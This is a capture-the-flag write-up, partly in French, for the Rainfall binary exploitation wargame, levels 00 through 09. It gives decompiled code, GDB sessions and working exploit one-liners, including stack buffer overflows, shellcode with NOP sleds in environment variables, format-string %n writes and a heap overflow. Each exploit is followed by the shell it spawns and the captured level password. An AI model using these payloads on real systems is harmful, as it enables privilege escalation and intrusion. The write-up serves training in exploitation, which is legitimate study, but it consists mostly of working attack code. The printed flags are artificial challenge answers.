# Rainfall

## level 00

```c

undefined4 main(undefined4 param_1,int param_2)

{
  int iVar1;
  char *local_20;
  undefined4 local_1c;
  __uid_t local_18;
  __gid_t local_14;
  
  iVar1 = atoi(*(char **)(param_2 + 4));
  if (iVar1 == 0x1a7) {
    local_20 = strdup("/bin/sh");
    local_1c = 0;
    local_14 = getegid();
    local_18 = geteuid();
    setresgid(local_14,local_14,local_14);
    setresuid(local_18,local_18,local_18);
    execv("/bin/sh",&local_20);
  }
  else {
    fwrite("No !\n",1,5,(FILE *)stderr);
  }
  return 0;
}
```

```c
if (iVar1 == 0x1a7)
```

https://www.rapidtables.com/convert/number/hex-to-decimal.html?x=1A7

0x1a7 nous donne 423 

```bash
$ pwd
/home/user
$ whoami
level1
$ cd /home/user/level1
$ ls -a
.  ..  .bash_logout  .bashrc  level1  .pass  .profile
$ cat .pass
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
$ su level1
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
level1@RainFall:~$ ls
```

## level 01

Ghidra :
```c
void main(void)

{
  char local_50 [76];
  
  gets(local_50);
  return;
}
```
GDB :

``` bash
level1@RainFall:~$ gdb level1
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini
(gdb) q
```

Ghidra :

```c
void run(void)

{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}
```

```bash
level1@RainFall:~$ python -c 'print "a"*76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$ (python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat ) | ./level1
Good... Wait what?
whoami
level2
ls
ls: cannot open directory .: Permission denied
pwd
/home/user/level1
cd ..
cd /home/user/level2
ls -a
.  ..  .bash_logout  .bashrc  level2  .pass  .profile
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
level1@RainFall:~$ su level2
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
```
On rajoute le cat pour maintenir le fd

## level 02
```bash

export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')

(gdb) x/s *((char**)environ)
0xbffff4dd:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...

(gdb) x/s *((char**)environ)
0xbffff4dd:      "SHELLCODE=
(gdb) quit

level2@RainFall:~$ python -c 'print "A"*80 + "\x4b\x85\x04\x08" + "\x46\xf5\xff\xbf"' > /tmp/p
level2@RainFall:~$ (cat /tmp/p;cat) | ./level2 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAAAKF���
$ id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
$ whoami
level3
$ 
```
## level 03
```bash

level3@RainFall:~$ (python -c 'import struct; print struct.pack("I", 0x804988c) + "%60c%4$n"';cat) | ./level3
�                                                           
Wait what?!
ls
ls: cannot open directory .: Permission denied
id
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
whoami
level4
cd ../level4
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## level 04
```bash
python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
## level 05
```bash

python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' | ./level5

id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
whoami 
level6
cd ../level6
cat .passwd
cat: .passwd: No such file or directory
cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
## level 06
```bash

level6@RainFall:~$ ./level6 `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
## level 07
```bash

level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
## level 08
```bash

level8@RainFall:~$ ./level8 
(nil), (nil) 
auth " " 
0x804a008, (nil) 
service ""
0x804a008, 0x804a018 
service "AAAA"
0x804a008, 0x804a028 
login
$ id
uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
$ whoami 
level9
$ cat ../level9/.pass
cat: ../level9/.pass: Permission denied
$ cd ../level9
$ \
> 
$ ls
level9
$ ls 0a
ls: cannot access 0a: No such file or directory
$ ls -a
.  ..  .bash_logout  .bashrc  level9  .pass  .profile
$ cat .pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
## level09
```bash

level9@RainFall:~$ env -i payload=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level9 $(python -c 'print "\x63\xfc\xff\xbf"+"B"*104+"\x0c\xa0\x04\x08"')
$ id
uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
$ whoami 
bonus0
$ cd ../bonus0  
$ cat .pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
